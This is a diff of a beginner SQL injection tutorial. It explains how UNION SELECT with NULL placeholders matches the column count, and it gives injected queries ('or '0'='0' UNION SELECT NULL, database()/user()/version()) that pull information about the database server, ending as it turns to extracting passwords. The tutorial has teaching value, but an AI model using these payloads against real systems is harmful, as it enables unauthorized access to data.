@@ -230,22 +230,63 @@ I want you to new that there is more data that we can find about the database it
 SELECT first_name FROM users WHERE the middle_name IS NULL;
 {% endhighlight %}
 
-In that case that query bring us any user that he have no middle name, so that is the main used for NULL, but there is more used for it, but before that there is more things you should know, there is a way to query some data about the database it self, there is some  [functions](https://www.w3schools.com/sql/sql_ref_mysql.asp) that used for check some value like in what database we work on, what is the user we used for mysql, what is the version of mysql database  we can actually use null to load some data for the database itself! to doing so just type the following:
+In that case that query bring us any user that he have no middle name, so that is the main used for NULL, there is another way to use it, but before that there is more things you should know, there is a way to query some data about the database it self, there is some  [functions](https://www.w3schools.com/sql/sql_ref_mysql.asp) that used for check some values related to the database itself or mysql server we working on, as example what is the user we used for mysql, what is the version of mysql database, what is the name of the database we working on it and so on.
+
 {% highlight mysql %}
 USE mysite;
-SELECT NULL, database();
+SELECT database();
 {% endhighlight %}
 
-In that case the database will show us it's name after we chose the database, in that case the database name will be 'mysite'.
+In that case the database will show us his name after we chose the database, in my case the database name will be 'mysite'.
 
 ![sql-injection-024.png](/assets/images/sql-injection-024.png)
-**Figure 24** Source code.
+**Figure 24** Database function.
 
-So, we can use sort of function query to extract more data about the database and it's importent you new them all:
+So let's think carefully, we have a way to extract data about the database, but if we use injection with `UNION` we must use in our case two SELECT query because the original query that the php code produces include two column, so if we do something like:
+
 {% highlight mysql %}
-SELECT NULL, users();
+select
+  first_name,
+  last_name
+  FROM users WHERE user_id='1' or '0'='0'
+  UNION
+  SELECT database();
+{% endhighlight %}
+
+we will get an error.
+
+![sql-injection-025.png](/assets/images/sql-injection-025.png)
+**Figure 25** Erorr "different number of columns".
+
+For that matter we need to use other query that contain `UNION SELECT` with two another columns, we can achieve that goal with NULL, to doing so just type the following:
+
+{% highlight mysql %}
+select
+  first_name,
+  last_name
+  FROM users WHERE user_id='1' or '0'='0'
+  UNION
+  SELECT NULL, database();
+{% endhighlight %}
+
+So, we can use sort of function query to extract more data about the database and it's important that you new them all or most of them:
+{% highlight mysql %}
+SELECT NULL, database();
+SELECT NULL, user();
 SELECT NULL, version();
 {% endhighlight %}
+
+![sql-injection-026.png](/assets/images/sql-injection-026.png)
+**Figure 26** Select null with function.
+
+Now we know lets do some injection.
+![sql-injection-027.png](/assets/images/sql-injection-027.png)
+**Figure 27** database().
+![sql-injection-028.png](/assets/images/sql-injection-028.png)
+**Figure 28** version().
+![sql-injection-029.png](/assets/images/sql-injection-029.png)
+**Figure 29** user().
+
 
 Now let's do the same with SELECT name that contain some query for password, the query I need to accomplish should look as follow:
 ```
